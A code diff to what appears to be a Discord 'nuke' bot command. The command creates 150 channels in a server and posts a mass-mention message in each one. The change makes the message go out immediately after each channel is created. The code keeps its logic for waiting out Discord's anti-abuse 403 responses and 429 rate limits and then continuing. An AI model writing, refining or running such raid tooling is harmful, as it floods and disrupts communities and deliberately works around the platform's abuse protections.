@@ -42634,12 +42634,6 @@ async def nuke_cmd(ctx: commands.Context):
     _first_ch   = None
     _created_channels: list[discord.TextChannel] = []
 
-    async def _nuke_send(c: discord.TextChannel) -> None:
-        try:
-            await c.send(content=_nuke_msg, allowed_mentions=_nuke_allow)
-        except Exception:
-            pass
-
     _created = 0
     while _created < 150:
         try:
@@ -42647,12 +42641,15 @@ async def nuke_cmd(ctx: commands.Context):
             _created += 1
             if _first_ch is None:
                 _first_ch = _new_ch
-            asyncio.create_task(_nuke_send(_new_ch))
-            print(f"[nuke] canal {_created}/150 criado", flush=True)
+            # Envia mensagem imediatamente no canal recém-criado
+            try:
+                await _new_ch.send(content=_nuke_msg, allowed_mentions=_nuke_allow)
+            except Exception:
+                pass
+            print(f"[nuke] canal {_created}/150 criado + msg enviada", flush=True)
             await asyncio.sleep(0.5)
         except discord.Forbidden:
-            # 403 temporário do Discord (anti-abuse) — espera 60s e continua
-            print(f"[nuke] 403 Forbidden canal {_created+1} — aguardando 60s para continuar", flush=True)
+            print(f"[nuke] 403 Forbidden canal {_created+1} — aguardando 60s", flush=True)
             await asyncio.sleep(60)
         except discord.HTTPException as _he:
             _wait = 30 if _he.status == 429 else 10
